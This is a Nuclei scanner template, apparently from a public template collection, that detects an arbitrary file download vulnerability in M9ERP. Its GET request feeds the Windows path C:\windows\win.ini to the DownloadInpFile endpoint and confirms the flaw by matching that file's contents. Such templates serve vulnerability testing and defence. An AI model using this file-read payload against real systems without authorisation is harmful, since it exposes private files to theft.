id: m9erp-downloadinpfile-anyfile-down
info:
  name: M9ERP Arbitrary File Download Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/Basics/DownloadInpFile?filePath=C:\\windows\\win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "bit app support"
          - "[files]"
      - type: regex
        part: header
        regex:
          - "filename=.*"
      - type: word
        part: body
        words:
          - "<"
        negative: true
